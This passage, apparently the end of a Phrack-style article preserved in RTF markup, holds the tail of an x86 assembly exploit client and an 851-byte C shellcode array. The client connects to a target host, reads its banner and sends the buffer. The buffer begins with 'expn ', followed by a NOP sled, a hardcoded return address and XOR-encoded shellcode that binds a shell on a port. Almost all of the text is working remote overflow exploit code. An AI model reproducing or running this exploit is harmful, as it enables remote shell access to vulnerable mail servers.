\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit1
\par 
\par \hich\af1\dbch\af28\loch\f1 ip_aight:
\par \tab \hich\af1\dbch\af28\loch\f1 mov  \hich\af1\dbch\af28\loch\f1    sin.sin_addr, eax
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     continue
\par 
\par \hich\af1\dbch\af28\loch\f1 gethost:
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset _host
\par \tab \hich\af1\dbch\af28\loch\f1 call    gethostbyname
\par \tab \hich\af1\dbch\af28\loch\f1 test    eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     gothost
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 push    reshostl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset reshost
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit1
\par 
\par \hich\af1\dbch\af28\loch\f1 gothost:
\par \tab \hich\af1\dbch\af28\loch\f1 mov     eax, [eax+0ch]
\par \tab \hich\af1\dbch\af28\loch\f1 mov     eax, [eax]
\par \tab \hich\af1\dbch\af28\loch\f1 mov     eax, [eax]
\par \tab \hich\af1\dbch\af28\loch\f1 mov     sin.sin_addr, eax
\par 
\par \hich\af1\dbch\af28\loch\f1 continue:
\par \tab \hich\af1\dbch\af28\loch\f1 push    size sin
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset sin
\par \tab \hich\af1\dbch\af28\loch\f1 push    sock
\par \tab \hich\af1\dbch\af28\loch\f1 call    connect
\par \tab \hich\af1\dbch\af28\loch\f1 or      eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 jz      connect_ok
\par \tab \hich\af1\dbch\af28\loch\f1 push    cnerrorl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset cnerror
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp   \hich\af1\dbch\af28\loch\f1   quit1
\par 
\par \hich\af1\dbch\af28\loch\f1 connect_ok:
\par \tab \hich\af1\dbch\af28\loch\f1 push    respl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset response
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab 
\par \tab \hich\af1\dbch\af28\loch\f1 xor     eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    1000
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset buffer
\par \tab \hich\af1\dbch\af28\loch\f1 push    sock
\par \tab \hich\af1\dbch\af28\loch\f1 call    recv
\par \tab \hich\af1\dbch\af28\loch\f1 or      eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 jg      sveet
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 push    derrorl        
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset derror
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     quit1
\par 
\par \hich\af1\dbch\af28\loch\f1 sveet:        
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset buffer
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par 
\par \tab \hich\af1\dbch\af28\loch\f1 xor     eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    sploit_length
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset sploit
\par \tab \hich\af1\dbch\af28\loch\f1 push    sock
\par \tab \hich\af1\dbch\af28\loch\f1 call    send
\par \tab \hich\af1\dbch\af28\loch\f1 push    succes\hich\af1\dbch\af28\loch\f1 sl
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset success
\par \tab \hich\af1\dbch\af28\loch\f1 call    write_console
\par 
\par \hich\af1\dbch\af28\loch\f1 quit1:
\par \tab \hich\af1\dbch\af28\loch\f1 push    sock
\par \tab \hich\af1\dbch\af28\loch\f1 call    closesocket
\par \hich\af1\dbch\af28\loch\f1 quit2:
\par \tab \hich\af1\dbch\af28\loch\f1 call    WSACleanup
\par \hich\af1\dbch\af28\loch\f1 quit3:
\par \tab \hich\af1\dbch\af28\loch\f1 push    0
\par \tab \hich\af1\dbch\af28\loch\f1 call    ExitProcess
\par \hich\af1\dbch\af28\loch\f1 parse   proc
\par \hich\af1\dbch\af28\loch\f1 ;cheap parsing.. 
\par \hich\af1\dbch\af28\loch\f1 lewp9:
\par \tab \hich\af1\dbch\af28\loch\f1 xor     eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 cld
\par \tab \hich\af1\dbch\af28\loch\f1 lodsb
\par \tab }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 cmp     al, 20h
\par \tab \hich\af1\dbch\af28\loch\f1 jz      done
\par \tab \hich\af1\dbch\af28\loch\f1 test    al, al
\par \tab \hich\af1\dbch\af28\loch\f1 jz      done2
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 stosb
\par \tab \hich\af1\dbch\af28\loch\f1 dec     ecx
\par \tab \hich\af1\dbch\af28\loch\f1 jmp     lewp9
\par \hich\af1\dbch\af28\loch\f1 done:
\par \tab \hich\af1\dbch\af28\loch\f1 dec     ecx
\par \hich\af1\dbch\af28\loch\f1 done2:
\par \tab \hich\af1\dbch\af28\loch\f1 ret
\par \hich\af1\dbch\af28\loch\f1 endp
\par 
\par \hich\af1\dbch\af28\loch\f1 str2num proc
\par \tab \hich\af1\dbch\af28\loch\f1 push    eax ecx edi
\par \tab \hich\af1\dbch\af28\loch\f1 xor     eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 xor     ecx, ecx
\par \tab \hich\af1\dbch\af28\loch\f1 xor     edx, edx
\par \tab \hich\af1\dbch\af28\loch\f1 xor     edi, edi
\par \hich\af1\dbch\af28\loch\f1 lewp2:
\par \tab }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 xor     al, al
\par \tab \hich\af1\dbch\af28\loch\f1 xlat
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 test    al, al
\par \tab \hich\af1\dbch\af28\loch\f1 jz      end_it
\par \tab }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 sub     al, 030h
\par \tab \hich\af1\dbch\af28\loch\f1 mov     cl, al
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 mov     eax, edx
\par \tab \hich\af1\dbch\af28\loch\f1 mul     numbase
\par \tab \hich\af1\dbch\af28\loch\f1 add     eax, ecx
\par \tab \hich\af1\dbch\af28\loch\f1 mov     edx, eax
\par \tab }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 inc     ebx
\par \tab \hich\af1\dbch\af28\loch\f1 inc     edi
\par \tab \hich\af1\dbch\af28\loch\f1 cmp     edi, 0ah
\par \tab \hich\af1\dbch\af28\loch\f1 jnz     lewp2
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 end_it:
\par \tab \hich\af1\dbch\af28\loch\f1 pop     edi ecx eax
\par \tab }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 ret
\par \hich\af1\dbch\af28\loch\f1 endp
\par 
\par \hich\af1\dbch\af28\loch\f1 init_console  proc
\par \tab }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 push    -10
\par \tab \hich\af1\dbch\af28\loch\f1 call    GetStdHandle
\par \tab \hich\af1\dbch\af28\loch\f1 or      eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 je      init_error
\par \tab \hich\af1\dbch\af28\loch\f1 mov     [console_in], eax
\par \tab \hich\af1\dbch\af28\loch\f1 push    -11
\par \tab \hich\af1\dbch\af28\loch\f1 call    GetStdHandle
\par \tab \hich\af1\dbch\af28\loch\f1 or      eax, eax
\par \tab \hich\af1\dbch\af28\loch\f1 je      init_error
\par \tab \hich\af1\dbch\af28\loch\f1 mov     [console_out], eax
\par \tab \hich\af1\dbch\af28\loch\f1 ret
\par \hich\af1\dbch\af28\loch\f1 init_error:
\par \tab \hich\af1\dbch\af28\loch\f1 push    0
\par \tab \hich\af1\dbch\af28\loch\f1 call    ExitProcess
\par \hich\af1\dbch\af28\loch\f1 endp
\par 
\par \hich\af1\dbch\af28\loch\f1 write_console proc    text_out:dword, text_len:dword
\par \tab \hich\af1\dbch\af28\loch\f1 pusha
\par \tab \hich\af1\dbch\af28\loch\f1 push    0
\par \tab \hich\af1\dbch\af28\loch\f1 push    offset bytes_read 
\par \tab \hich\af1\dbch\af28\loch\f1 push    text_len          
\par \tab \hich\af1\dbch\af28\loch\f1 push    text_out          
\par \tab \hich\af1\dbch\af28\loch\f1 push    console_out       
\par \tab \hich\af1\dbch\af28\loch\f1 call    WriteConsoleA
\par \tab \hich\af1\dbch\af28\loch\f1 popa
\par \tab \hich\af1\dbch\af28\loch\f1 ret
\par \hich\af1\dbch\af28\loch\f1 endp
\par 
\par \hich\af1\dbch\af28\loch\f1 end     start
\par 
\par \hich\af1\dbch\af28\loch\f1 ;--(code ends)----\hich\af1\dbch\af28\loch\f1 --------------------------------------------------------
\par \hich\af1\dbch\af28\loch\f1 <-->
\par \hich\af1\dbch\af28\loch\f1 Here is the shellcode in c format:
\par 
\par \hich\af1\dbch\af28\loch\f1 <++> P55/Win32-overflows/slxploit-shellcode.c !f4bcdaf5
\par \hich\af1\dbch\af28\loch\f1 #define sploit_length 851
\par 
\par \hich\af1\dbch\af28\loch\f1 unsigned char sploit[851] = \{
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 0x65, 0x7\hich\af1\dbch\af28\loch\f1 8, 0x70, 0x6e, 0x20, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0\hich\af1\dbch\af28\loch\f1 x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x9\hich\af1\dbch\af28\loch\f1 0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0\hich\af1\dbch\af28\loch\f1 x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0\hich\af1\dbch\af28\loch\f1 x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\hich\af1\dbch\af28\loch\f1  0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   \hich\af1\dbch\af28\loch\f1 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 0x90, 0x90, 0xeb, 0x07, 0x90, 0xaa, 0x1c, 0x9c, 0x77, 0x90, 0x90, 0x90,
\par \hich\af1\dbch\af28\loch\f1   0x33, 0xc0, 0x50, 0xf7, 0xd0, 0x50, 0x59, 0xf2, 0xaf, 0x59, 0xb1, 0xc6,
\par \hich\af1\dbch\af28\loch\f1   0x8b, 0xc7, 0x48, 0x80, 0x30, 0x99\hich\af1\dbch\af28\loch\f1 , 0xe2, 0xfa, 0x33, 0xf6, 0x96, 0xbb,
\par \hich\af1\dbch\af28\loch\f1   0x99, 0x10, 0x11, 0x44, 0xc1, 0xeb, 0x08, 0x56, 0xff, 0x13, 0x8b, 0xd0,
\par \hich\af1\dbch\af28\loch\f1   0xfc, 0x33, 0xc9, 0xb1, 0x0b, 0x49, 0x32, 0xc0, 0xac, 0x84, 0xc0, 0x75,
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 0xf9, 0x52, 0x51, \hich\af1\dbch\af28\loch\f1 0x56, 0x52, 0xb3, 0x0c, 0xff, 0x13, 0xab, 0x59, 0x5a,
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 0xe2, 0xec, 0x32, 0xc0, 0xac, 0x84, 0xc0, 0x75, 0xf9, 0xb3, 0x10, 0x56,
\par \hich\af1\dbch\af28\loch\f1   0xff, 0x13, 0x8b, 0xd0, 0xfc, 0x33, 0xc9, 0xb1, 0x06, 0x32, 0xc0, 0xac,
\par \hich\af1\dbch\af28\loch\f1   0x84, 0xc0, 0x75, 0xf9, 0x52, 0x51, 0x56, 0x52, 0xb3\hich\af1\dbch\af28\loch\f1 , 0x0c, 0xff, 0x13,
\par \hich\af1\dbch\af28\loch\f1   0xab, 0x59, 0x5a, 0xe2, 0xec, 0x83, 0xc6, 0x05, 0x33, 0xc0, 0x50, 0x40,
\par \hich\af1\dbch\af28\loch\f1   0x50, 0x40, 0x50, 0xff, 0x57, 0xe8, 0x93, 0x6a, 0x10, 0x56, 0x53, 0xff,
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 0x57, 0xec, 0x6a, 0x02, 0x53, 0xff, 0x57, 0xf0, 0x33, 0xc0, 0x57, 0x50,
\par \hich\af1\dbch\af28\loch\f1   0xb0, 0x0c, \hich\af1\dbch\af28\loch\f1 0xab, 0x58, 0xab, 0x40, 0xab, 0x5f, 0x48, 0x50, 0x57, 0x56,
\par \hich\af1\dbch\af28\loch\f1   0xad, 0x56, 0xff, 0x57, 0xc0, 0x48, 0x50, 0x57, 0xad, 0x56, 0xad, 0x56,
\par \hich\af1\dbch\af28\loch\f1   0xff, 0x57, 0xc0, 0x48, 0xb0, 0x44, 0x89, 0x07, 0x57, 0xff, 0x57, 0xc4,
\par \hich\af1\dbch\af28\loch\f1   0x33, 0xc0, 0x8b, 0x46, 0xf4, 0x89, 0x47, 0x3c\hich\af1\dbch\af28\loch\f1 , 0x89, 0x47, 0x40, 0x8b,
\par \hich\af1\dbch\af28\loch\f1   0x06, 0x89, 0x47, 0x38, 0x33, 0xc0, 0x66, 0xb8, 0x01, 0x01, 0x89, 0x47,
\par \hich\af1\dbch\af28\loch\f1   0x2c, 0x57, 0x57, 0x33, 0xc0, 0x50, 0x50, 0x50, 0x40, 0x50, 0x48, 0x50,
\par \hich\af1\dbch\af28\loch\f1   0x50, 0xad, 0x56, 0x33, 0xc0, 0x50, 0xff, 0x57, 0xc8, 0xff, 0x76, 0xf0,
\par \hich\af1\dbch\af28\loch\f1   0xff, \hich\af1\dbch\af28\loch\f1 0x57, 0xcc, 0xff, 0x76, 0xfc, 0xff, 0x57, 0xcc, 0x48, 0x50, 0x50,
\par \hich\af1\dbch\af28\loch\f1   0x53, 0xff, 0x57, 0xf4, 0x8b, 0xd8, 0x33, 0xc0, 0xb4, 0x04, 0x50, 0xc1,
\par \hich\af1\dbch\af28\loch\f1   0xe8, 0x04, 0x50, 0xff, 0x57, 0xd4, 0x8b, 0xf0, 0x33, 0xc0, 0x8b, 0xc8,
\par \hich\af1\dbch\af28\loch\f1   0xb5, 0x04, 0x50, 0x50, 0x57, 0x51, 0x50\hich\af1\dbch\af28\loch\f1 , 0xff, 0x77, 0xa8, 0xff, 0x57,
\par \hich\af1\dbch\af28\loch\f1   0xd0, 0x83, 0x3f, 0x01, 0x7c, 0x22, 0x33, 0xc0, 0x50, 0x57, 0xff, 0x37,
\par \hich\af1\dbch\af28\loch\f1   0x56, 0xff, 0x77, 0xa8, 0xff, 0x57, 0xdc, 0x0b, 0xc0, 0x74, 0x2f, 0x33,
\par \hich\af1\dbch\af28\loch\f1   0xc0, 0x50, 0xff, 0x37, 0x56, 0x53, 0xff, 0x57, 0xf8, 0x6a, 0x50, 0xff,
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 0x57, 0xe0, 0xeb, 0xc8, 0x33, 0xc0, 0x50, 0xb4, 0x04, 0x50, 0x56, 0x53,
\par \hich\af1\dbch\af28\loch\f1   0xff, 0x57, 0xfc, 0x57, 0x33, 0xc9, 0x51, 0x50, 0x56, 0xff, 0x77, 0xac,
\par \hich\af1\dbch\af28\loch\f1   0xff, 0x57, 0xd8, 0x6a, 0x50, 0xff, 0x57, 0xe0, 0xeb, 0xaa, 0x50, 0xff,
\par \hich\af1\dbch\af28\loch\f1   0x57, 0xe4, 0x90, 0xd2, 0xdc, 0xcb\hich\af1\dbch\af28\loch\f1 , 0xd7, 0xdc, 0xd5, 0xaa, 0xab, 0x99,
\par \hich\af1\dbch\af28\loch\f1   0xda, 0xeb, 0xfc, 0xf8, 0xed, 0xfc, 0xc9, 0xf0, 0xe9, 0xfc, 0x99, 0xde,
\par \hich\af1\dbch\af28\loch\f1   0xfc, 0xed, 0xca, 0xed, 0xf8, 0xeb, 0xed, 0xec, 0xe9, 0xd0, 0xf7, 0xff,
\par \hich\af1\dbch\af28\loch\f1   0xf6, 0xd8, 0x99, 0xda, 0xeb, 0xfc, 0xf8, 0xed, 0xfc, 0xc9, 0xeb, 0x\hich\af1\dbch\af28\loch\f1 f6,
\par \hich\af1\dbch\af28\loch\f1   0xfa, 0xfc, 0xea, 0xea, 0xd8, 0x99, 0xda, 0xf5, 0xf6, 0xea, 0xfc, 0xd1,
\par \hich\af1\dbch\af28\loch\f1   0xf8, 0xf7, 0xfd, 0xf5, 0xfc, 0x99, 0xc9, 0xfc, 0xfc, 0xf2, 0xd7, 0xf8,
\par \hich\af1\dbch\af28\loch\f1   0xf4, 0xfc, 0xfd, 0xc9, 0xf0, 0xe9, 0xfc, 0x99, 0xde, 0xf5, 0xf6, 0xfb,
\par \hich\af1\dbch\af28\loch\f1   0xf8, 0xf5, 0xd8, 0xf5, 0xf5\hich\af1\dbch\af28\loch\f1 , 0xf6, 0xfa, 0x99, 0xce, 0xeb, 0xf0, 0xed,
\par \hich\af1\dbch\af28\loch\f1   0xfc, 0xdf, 0xf0, 0xf5, 0xfc, 0x99, 0xcb, 0xfc, 0xf8, 0xfd, 0xdf, 0xf0,
\par \hich\af1\dbch\af28\loch\f1   0xf5, 0xfc, 0x99, 0xca, 0xf5, 0xfc, 0xfc, 0xe9, 0x99, 0xdc, 0xe1, 0xf0,
\par \hich\af1\dbch\af28\loch\f1   0xed, 0xc9, 0xeb, 0xf6, 0xfa, 0xfc, 0xea, 0xea, 0x99, 0xce, 0x\hich\af1\dbch\af28\loch\f1 ca, 0xd6,
\par \hich\af1\dbch\af28\loch\f1   0xda, 0xd2, 0xaa, 0xab, 0x99, 0xea, 0xf6, 0xfa, 0xf2, 0xfc, 0xed, 0x99,
\par \hich\af1\dbch\af28\loch\f1   0xfb, 0xf0, 0xf7, 0xfd, 0x99, 0xf5, 0xf0, 0xea, 0xed, 0xfc, 0xf7, 0x99,
\par \hich\af1\dbch\af28\loch\f1   0xf8, 0xfa, 0xfa, 0xfc, 0xe9, 0xed, 0x99, 0xea, 0xfc, 0xf7, 0xfd, 0x99,
\par \hich\af1\dbch\af28\loch\f1   0xeb, 0xfc, 0xfa, 0xef\hich\af1\dbch\af28\loch\f1 , 0x99, 0x9b, 0x99, 
\par \hich\af1\dbch\af28\loch\f1   }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 0x00, 0x00, // word value for bind port, client must mod and XOR with 0x99
\par \hich\af1\dbch\af28\loch\f1   0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
\par \hich\af1\dbch\af28\loch\f1   0xfa, 0xf4, 0xfd, 0xb7, 0xfc, 0xe1, 0xfc, 0x99, 0xff, 0xff, 0xff, 0xff, 
\par \hich\af1\dbch\af28\loch\f1   0x0d, \hich\af1\dbch\af28\loch\f1 0x0a\};
\par \hich\af1\dbch\af28\loch\f1 <-->
\par \hich\af1\dbch\af28\loch\f1 ----[  EOF
\par 
\par 
\par }}